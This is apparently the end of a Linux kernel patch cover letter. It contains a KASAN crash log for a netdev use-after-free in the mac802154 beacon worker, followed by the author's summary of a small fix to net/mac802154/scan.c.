[   46.235835]  ieee802154_add_iface (net/mac802154/cfg.c:92)=0D
[   46.242768]  nl802154_new_interface (net/ieee802154/rdev-ops.h:56 net/ie=
ee802154/nl802154.c:948)=0D
[   46.251225]  genl_family_rcv_msg_doit (net/netlink/genetlink.c:1114)=0D
[   46.259138]  genl_rcv_msg (net/netlink/genetlink.c:1194 net/netlink/gene=
tlink.c:1209)=0D
[   46.267140]  netlink_rcv_skb (net/netlink/af_netlink.c:2556)=0D
[   46.274455]  genl_rcv (net/netlink/genetlink.c:1218)=0D
[   46.279978]  netlink_unicast (net/netlink/af_netlink.c:1319 net/netlink/=
af_netlink.c:1345)=0D
[   46.287407]  netlink_sendmsg (net/netlink/af_netlink.c:1900)=0D
[   46.294879]  ____sys_sendmsg (net/socket.c:775 (discriminator 1) net/soc=
ket.c:790 (discriminator 1) net/socket.c:2684 (discriminator 1))=0D
[   46.302513]  ___sys_sendmsg (net/socket.c:2738)=0D
[   46.310950]  __sys_sendmsg (net/socket.c:2770)=0D
[   46.317836]  do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/entr=
y/syscall_64.c:94)=0D
[   46.325225]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:1=
21)=0D
[   46.334407] =0D
[   46.337166] Freed by task 257:=0D
[   46.342323]  kasan_save_stack (mm/kasan/common.c:57)=0D
[   46.349979]  kasan_save_track (mm/kasan/common.c:78)=0D
[   46.357214]  kasan_save_free_info (mm/kasan/generic.c:584)=0D
[   46.365218]  __kasan_slab_free (mm/kasan/common.c:253 mm/kasan/common.c:=
285)=0D
[   46.372115]  kfree (include/linux/kasan.h:235 mm/slub.c:2705 mm/slub.c:6=
405 mm/slub.c:6720)=0D
[   46.378280]  device_release (drivers/base/core.c:2636)=0D
[   46.385399]  kobject_put (lib/kobject.c:689 lib/kobject.c:720 include/li=
nux/kref.h:65 lib/kobject.c:737)=0D
[   46.391492]  netdev_run_todo (net/core/dev.c:11755)=0D
[   46.398749]  genl_family_rcv_msg_doit (net/netlink/genetlink.c:1117)=0D
[   46.407140]  genl_rcv_msg (net/netlink/genetlink.c:1194 net/netlink/gene=
tlink.c:1209)=0D
[   46.413714]  netlink_rcv_skb (net/netlink/af_netlink.c:2556)=0D
[   46.421327]  genl_rcv (net/netlink/genetlink.c:1218)=0D
[   46.427117]  netlink_unicast (net/netlink/af_netlink.c:1319 net/netlink/=
af_netlink.c:1345)=0D
[   46.434304]  netlink_sendmsg (net/netlink/af_netlink.c:1900)=0D
[   46.441234]  ____sys_sendmsg (net/socket.c:775 (discriminator 1) net/soc=
ket.c:790 (discriminator 1) net/socket.c:2684 (discriminator 1))=0D
[   46.448433]  ___sys_sendmsg (net/socket.c:2738)=0D
[   46.455085]  __sys_sendmsg (net/socket.c:2770)=0D
[   46.464857]  do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/entr=
y/syscall_64.c:94)=0D
[   46.471414]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:1=
21)=0D
[   46.480946] =0D
[   46.483515] The buggy address belongs to the object at ffff888009701000=
=0D
[   46.483515]  which belongs to the cache kmalloc-4k of size 4096=0D
[   46.507299] The buggy address is located 2856 bytes inside of=0D
[   46.507299]  freed 4096-byte region [ffff888009701000, ffff888009702000)=
=0D
[   46.530004] =0D
[   46.532790] The buggy address belongs to the physical page:=0D
[   46.543614] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0=
x0 pfn:0x9700=0D
[   46.558297] head: order:3 mapcount:0 entire_mapcount:0 nr_pages_mapped:0=
 pincount:0=0D
[   46.572146] flags: 0x100000000000040(head|node=3D0|zone=3D1)=0D
[   46.585565] page_type: f5(slab)=0D
[   46.591088] raw: 0100000000000040 ffff8880010433c0 ffffea000018c610 ffff=
ea000009d410=0D
[   46.605298] raw: 0000000000000000 0000000000020002 00000000f5000000 0000=
000000000000=0D
[   46.619680] head: 0100000000000040 ffff8880010433c0 ffffea000018c610 fff=
fea000009d410=0D
[   46.635070] head: 0000000000000000 0000000000020002 00000000f5000000 000=
0000000000000=0D
[   46.649082] head: 0100000000000003 fffffffffffffe01 00000000ffffffff 000=
00000ffffffff=0D
[   46.663669] head: 0000000000000000 0000000000000000 00000000ffffffff 000=
0000000000000=0D
[   46.677896] page dumped because: kasan: bad access detected=0D
[   46.687759] =0D
[   46.690081] Memory state around the buggy address:=0D
[   46.700017]  ffff888009701a00: fb fb fb fb fb fb fb fb fb fb fb fb fb fb=
 fb fb=0D
[   46.712698]  ffff888009701a80: fb fb fb fb fb fb fb fb fb fb fb fb fb fb=
 fb fb=0D
[   46.724750] >ffff888009701b00: fb fb fb fb fb fb fb fb fb fb fb fb fb fb=
 fb fb=0D
[   46.737595]                                   ^=0D
[   46.745612]  ffff888009701b80: fb fb fb fb fb fb fb fb fb fb fb fb fb fb=
 fb fb=0D
[   46.758377]  ffff888009701c00: fb fb fb fb fb fb fb fb fb fb fb fb fb fb=
 fb fb=0D
[   46.771889] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=0D
[   46.785657] clocksource: Marking clocksource tsc unstable due to frequen=
cy skew=0D
[   46.798517] clocksource: Watchdog               kvm-clock interval:     =
        1581ns=0D
[   46.817052] clocksource: Clocksource                  tsc interval:     =
        1465ns=0D
[   46.834198] tsc: Marking TSC unstable due to clocksource watchdog=0D
[   46.852453] Kernel panic - not syncing: KASAN: panic_on_warn set ...=0D
[   46.865384] CPU: 1 UID: 0 PID: 54 Comm: kworker/u8:2 Not tainted 7.2.0-r=
c4-g88c17de85ddb #1 PREEMPT(lazy) =0D
[   46.884681] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_=
caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014=0D
[   46.909534] Workqueue: phy0-mac-cmds mac802154_beacon_worker=0D
[   46.920741] Call Trace:=0D
[   46.925297]  <TASK>=0D
[   46.929456]  vpanic (kernel/panic.c:651)=0D
-----END crash log-----

Best regards,
Zihan Xi

Zihan Xi (1):
  mac802154: fix netdev use-after-free in beacon worker

 net/mac802154/scan.c | 4 ++++
 1 file changed, 4 insertions(+)

--=20
2.43.0

